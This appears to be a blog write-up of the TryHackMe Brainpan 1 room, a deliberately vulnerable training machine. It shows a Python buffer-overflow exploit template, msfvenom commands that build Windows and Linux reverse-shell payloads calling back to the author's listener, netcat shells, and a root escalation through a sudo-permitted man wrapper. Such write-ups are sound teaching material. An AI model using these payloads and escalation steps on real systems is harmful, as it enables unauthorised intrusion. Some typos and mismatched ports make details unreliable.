---
title: "Brainpan 1 Writeup THM"
description: "My writeup of the TryHackMe room [Brainpan 1](https://tryhackme.com/room/brainpan)"
date: 2024-01-04
image: https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - Buffer Overflow
categories:
    - Room
    - Hard
---

I am going to start with a nmap scan:

```bash
nmap 10.10.143.30

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 12:34 EST
Nmap scan report for 10.10.143.30
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

```bash
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

Port 9999 contains the program:

```bash
nc 10.10.143.30 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD
```

And 10000 contains a http server:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png)

The site doesn’t tell us much, but I used ffuf for enumerating the subdirectories:

```bash
ffuf -u http://10.10.143.30:10000/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.143.30:10000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
```

He found the bin directory, which contains the exe!

I moved the exe in my windows machine with Immunity Debugger and mona installed.

And I started the server:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%201.png)

I will use this code for getting a reverse shell:

```bash
import socket

ip = "10.10.6.37"
port = 9999

offset = 0
overflow = "A" * offset
retn = ""
padding = "\x90" * 16
payload = ""
postfix = ""

buffer =  overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

With 600 bytes the server crushes.

So I am going to use metasploit to create a payload:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

And I got the offset using mona:

```bash
!mona findmsp -distance 5000
```

![Untitled](https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%202.png)

Now I can put the offset in the offset variable inside the script.

I am going to start searching for the bad characters:

Using a payload with all the characters and compare it with mona we get this:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%203.png)

After that we search for the jmp:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%204.png)

We need to put this in the retn variable of the script: \zf3\x12\x17\x31 (It is reversed because of the little eldiana rchitecture, which x86 CPUs have.)

Then we generate our payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.20.116 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02\x03\x04\x06\x07" -f c
```

And put it in the code.

And now if we run the code we should have a shell:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.6.37] 49292
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop>
```

Now I am just going to change the ip of the script and put the one of the machine, and we should have a shell in the remote server:

- note, i have used another msfvenom payload for this one:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.18.20.116 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02\x03\x04\x06\x07" -f c
```

```bash
nc -lvnp 4555
listening on [any] 4555 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.143.30] 41139
ls
checksrv.sh
web
python -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$
```

Nice!

We can see that we can run anansi_util with root

```bash
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

The interessing thing is the manual command, which is the man command.

```bash
sudo /home/anansi/bin/anansi_util manual /bin/sh
/usr/bin/man: manual-/bin/sh: No such file or directory
/usr/bin/man: manual_/bin/sh: No such file or directory
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
DASH(1)                   BSD General Commands Manual                  DASH(1)

NAME
     dash — command interpreter (shell)

SYNOPSIS
     dash [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name]
          [+o option_name] [command_file [argument ...]]
     dash -c [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name]
          [+o option_name] command_string [command_name [argument ...]]
     dash -s [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name]
          [+o option_name] [argument ...]

DESCRIPTION
     dash is the standard command interpreter for the system.  The current
     version of dash is in the process of being changed to conform with the
     POSIX 1003.2 and 1003.2a specifications for the shell.  This version has
     many features which make it appear similar in some respects to the Korn
     shell, but it is not a Korn shell clone (see ksh(1)).  Only features des‐
     ignated by POSIX, plus a few Berkeley extensions, are being incorporated
     into this shell.  This man page is not intended to be a tutorial or a
     complete specification of the shell.

 Manual page sh(1) line 1 (press h for help or q to quit)!/bin/sh
!/bin/sh
# whoami
whoami
root
```

And just like that we got a root shell!
